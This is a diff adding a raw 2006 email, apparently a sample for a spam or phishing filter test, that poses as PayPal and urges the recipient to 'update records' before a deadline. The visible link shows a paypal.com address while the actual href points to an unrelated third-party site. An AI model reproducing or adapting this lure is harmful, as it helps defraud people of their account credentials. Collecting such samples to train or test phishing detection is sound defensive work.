@@ -1,0 +1,36 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 58991469DA
+ for <user@login.example.com>; Wed, 13 Sep 2006 12:17:49 -0400 (EDT)
+Received: from dwellingsreal2.propagation.net (dwellingsreal2.propagation.net
+ [66.221.168.9])
+ by mail.example.org (Postfix) with ESMTP id 6527D6FA4DB
+ for <user@example.com>; Wed, 13 Sep 2006 12:17:49 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+ by dwellingsreal2.propagation.net (8.13.6/8.13.6) with ESMTP id k8DGHkTN016955
+ for <user@example.com>; Wed, 13 Sep 2006 11:17:48 -0500
+Date: Wed, 13 Sep 2006 11:17:46 -0500
+To: "user@example.com\r" <user@example.com>
+From: "service@paypal.com" <service@paypal.com>
+Subject: Limited Account Access -- Status Change
+Message-ID: <0fcecb8f1434def3e02b43a12051983f@localhost>
+X-Priority: 3
+X-Mailer: PHPMailer [version 1.72]
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+Content-Type: text/html; charset="iso-8859-1"
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 236
+
+<DIV><IMG height=50 src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" width=200 border=0> </DIV>
+<DIV><FONT size=2><FONT face=Verdana>Dear valued <STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal<SUP>®</SUP></SPAN> </STRONG>member</FONT>: <BR></FONT><BR><FONT face=Verdana size=2>It has come to our attention that your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> account information needs to be <BR>updated as part of our continuing commitment to protect your account and to <BR>reduce the instance of fraud on our website. If you could please take 5-10 minutes <BR>out of your online experience and update your personal records you will not run into <BR>any future problems with the online service. <BR> </DIV>
+<DIV>However, failure to update your records will result in account suspension. <BR>Please update your records on or before <FONT color=red><STRONG><FONT color=#ff0000>September</FONT> 15, 2006</STRONG>.</FONT> <BR><BR>Once you have updated your account records, your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> session will not be <BR>interrupted and will continue as normal. </DIV>
+<DIV>To update your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> records click on the following link: <BR><A href="http://www.spelde.nl/silvio/www.paypal.com/" target=_blank rel=nofollow _><FONT face=Verdana color=#003399 size=2>http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</FONT></A></DIV>
+<DIV> </DIV>
+<DIV>Thank You. <BR><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>® </SUP>UPDATE TEAM</STRONG></SPAN> </DIV></FONT>
+
